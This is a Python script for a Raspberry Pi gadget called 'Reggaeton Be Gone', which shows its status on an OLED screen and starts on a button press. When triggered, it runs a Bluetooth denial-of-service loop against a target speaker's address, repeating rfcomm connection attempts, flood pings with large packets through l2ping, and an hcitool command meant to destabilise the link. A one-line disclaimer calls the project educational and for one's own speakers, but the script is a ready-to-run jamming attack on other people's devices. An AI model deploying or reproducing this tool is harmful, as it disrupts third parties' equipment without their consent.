#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Reggaeton Be Gone (Versión sin IA)
# Roni Bandini @RoniBandini https://bandini.medium.com
# February 2024 V 1.0 (Sucio y Desprolijo, as Pappo said)
# MIT License (c) 2024 Roni Bandini
# Disclaimer: este es un proyecto educativo. Úselo con sus propios altavoces BT.

import os
import subprocess
import sys
import signal
import time
import datetime
from luma.core.interface.serial import i2c
from luma.oled.device import ssd1306
from PIL import Image, ImageDraw, ImageFont
from RPi import GPIO

# Configuración de la pantalla OLED I2C SSD1306 de 0.96 pulgadas
serial = i2c(port=1, address=0x3C)
disp = ssd1306(serial)

# Configuración de imagen
width = disp.width
height = disp.height
image = Image.new('1', (width, height))
draw = ImageDraw.Draw(image)

# Fuente para el texto
font = ImageFont.load_default()

# Configuración del botón
buttonPin = 26
GPIO.setwarnings(False)
GPIO.setmode(GPIO.BCM)
GPIO.setup(buttonPin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

# Configuración del ataque Bluetooth
myPath = "/home/user/music_be_gone/"
method = 3  # Método de ataque
targetAddr = ":::::"  # Dirección del dispositivo de destino
packagesSize = 800
threadsCount = 1000
myDelay = 0.1
forceFire = 0
attack_running = False  # Estado del ataque

def writeLog(myLine):
    now = datetime.datetime.now()
    dtFormatted = now.strftime("%Y-%m-%d %H:%M:%S")
    with open('log.txt', 'a') as f:
        myLine = str(dtFormatted) + "," + myLine
        f.write(myLine + "\n")

def updateScreen(message1, message2):
    # Limpiar la pantalla
    draw.rectangle((0, 0, width, height), outline=0, fill=0)
    # Mostrar los mensajes
    draw.text((0, 0), "Reggaeton BeGone", font=font, fill=255)
    draw.text((0, 16), message1, font=font, fill=255)
    draw.text((0, 32), message2, font=font, fill=255)
    disp.display(image)

def fireBT(method, targetAddr, threadsCount, packagesSize, myDelay):
    global attack_running
    writeLog("Firing with method #" + str(method) + ", pkg " + str(packagesSize) + ', target ' + targetAddr)
    
    for i in range(threadsCount):
        # Verificar si se presiona el botón para detener el ataque
        if GPIO.input(buttonPin) == GPIO.LOW:
            attack_running = False
            print("Attack stopped by button press.")
            break
        
        print(f'[*] Heavy Interference Attempt {i + 1}/{threadsCount}')
        
        try:
            # Intentar conectarse repetidamente usando rfcomm
            subprocess.call(['sudo', 'rfcomm', 'connect', 'hci0', targetAddr, '1'], timeout=5)
        except subprocess.TimeoutExpired:
            print("RFCOMM connection attempt timed out.")

        # Enviar pings grandes al dispositivo para sobrecargarlo
        try:
            subprocess.call(['sudo', 'l2ping', '-i', 'hci0', '-s', str(packagesSize), '-f', targetAddr])
        except Exception as e:
            print(f'Error during l2ping: {e}')
        
        # Enviar comando HCI para intentar desestabilizar la conexión
        try:
            subprocess.call(['sudo', 'hcitool', '-i', 'hci0', 'cmd', '0x08', '0x0008', '00'])
        except Exception as e:
            print(f'Error during hcitool command: {e}')
        
        time.sleep(myDelay)

def signal_handler(sig, frame):
    global attack_running
    print('Interrupted')
    attack_running = False
    writeLog("Interrupted")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def button_pressed():
    # Función para verificar si el botón ha sido presionado con debouncing
    if GPIO.input(buttonPin) == GPIO.LOW:
        time.sleep(0.05)  # Pequeño retardo para el debouncing
        if GPIO.input(buttonPin) == GPIO.LOW:  # Verificar de nuevo después del retardo
            return True
    return False

def main(argv):
    global attack_running
    
    print("")
    print("Reggaeton Be Gone 1.0 (Sin IA)")
    print("@RoniBandini, February 2024")
    print("Direct attack mode initiated")
    print("Waiting for button...")
    print("")

    writeLog("Started")

    # Mostrar pantalla inicial
    updateScreen(targetAddr, "Method #" + str(method))
    time.sleep(3)

    while True:
        if button_pressed():  # Verificar si el botón ha sido presionado
            if not attack_running:
                writeLog("Button pressed, starting attack")
                updateScreen("Firing speaker", "")
                print("Firing...")
                attack_running = True

                # Ejecutar el ataque
                fireBT(method, targetAddr, threadsCount, packagesSize, myDelay)
                
                # Volver a mostrar la pantalla inicial después del ataque
                updateScreen(targetAddr, "Method #" + str(method))
            else:
                writeLog("Button pressed, stopping attack")
                print("Attack stopped.")
                attack_running = False

                # Volver a mostrar la pantalla inicial inmediatamente después de detener el ataque
                updateScreen(targetAddr, "Method #" + str(method))

            # Esperar a que se suelte el botón para evitar múltiples activaciones
            while GPIO.input(buttonPin) == GPIO.LOW:
                time.sleep(0.1)
            
        time.sleep(0.1)

if __name__ == '__main__':
    main(sys.argv[1:])
